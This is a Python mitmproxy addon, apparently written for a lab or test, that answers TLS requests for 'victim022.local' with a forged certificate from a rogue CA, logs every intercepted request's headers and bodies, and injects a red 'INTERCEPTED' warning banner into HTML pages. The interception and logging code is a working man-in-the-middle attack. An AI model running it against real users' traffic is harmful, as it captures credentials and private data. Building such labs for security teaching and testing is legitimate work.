from mitmproxy import http, ctx, tls
import re


class CertificateForger:
    def __init__(self):
        # 这里使用 mitmproxyuser 能访问的路径
        self.forged_cert = {
            "victim022.local": {
                "certfile": "/home/mitmproxyuser/rogue-ca/forged-victim022.local.crt",
                "keyfile": "/home/mitmproxyuser/rogue-ca/forged-victim022.local.key",
            }
        }
        ctx.log.info("CertificateForger addon initialized")

    def tls_clienthello(self, data: tls.ClientHelloData):
        """
        mitmproxy v10+:
        - 事件: tls_clienthello
        - 参数: tls.ClientHelloData
        通过设置 data.context.cert 指定“对客户端使用的证书”。
        """
        sni = data.client_hello.sni
        ctx.log.info(f"tls_clienthello: SNI={sni!r}")
        if sni in self.forged_cert:
            ctx.log.info(f"拦截TLS握手：{sni}，使用伪造证书")
            cert = self.forged_cert[sni]
            data.context.cert = (cert["certfile"], cert["keyfile"])

    def request(self, flow: http.HTTPFlow) -> None:
        """记录所有请求细节"""
        ctx.log.info("-" * 50)
        ctx.log.info(f"拦截请求: {flow.request.method} {flow.request.pretty_url}")
        ctx.log.info(f"头信息:\n{flow.request.headers}")
        if flow.request.content:
            try:
                decoded = flow.request.content.decode("utf-8")
                ctx.log.info(f"请求主体:\n{decoded}")
            except UnicodeDecodeError:
                ctx.log.warn("请求主体包含二进制数据")

    def response(self, flow: http.HTTPFlow) -> None:
        """修改响应内容，注入警告横幅"""
        ctx.log.info(
            f"拦截响应: {flow.response.status_code} {flow.request.pretty_url}"
        )

        content_type = flow.response.headers.get("content-type", "")
        if not content_type.lower().startswith("text/html"):
            return

        content = flow.response.content
        if not content:
            return

        try:
            html = content.decode("utf-8")
        except UnicodeDecodeError:
            return

        # 注意：这里包含关键字 INTERCEPTED，供测试脚本检测
        WARNING_HTML = """
        <!-- INTERCEPTED BY MITM PROXY -->
        <div style='background:red;color:white;
                    padding:10px;
                    text-align:center;
                    font-weight:bold;
                    font-size:18px;
                    position:fixed;
                    top:0;
                    left:0;
                    right:0;
                    z-index:9999;'>
            安全警告：您的流量已被拦截 (MITM Proxy) - INTERCEPTED
        </div>
        """

        # 在第一个 <body> 标签后注入
        modified = re.sub(
            r"(<body[^>]*>)",
            r"\1" + WARNING_HTML,
            html,
            flags=re.IGNORECASE,
        )

        if modified != html:
            flow.response.text = modified  # mitmproxy 会自动处理编码/长度
            ctx.log.info("成功注入警告横幅")


addons = [CertificateForger()]

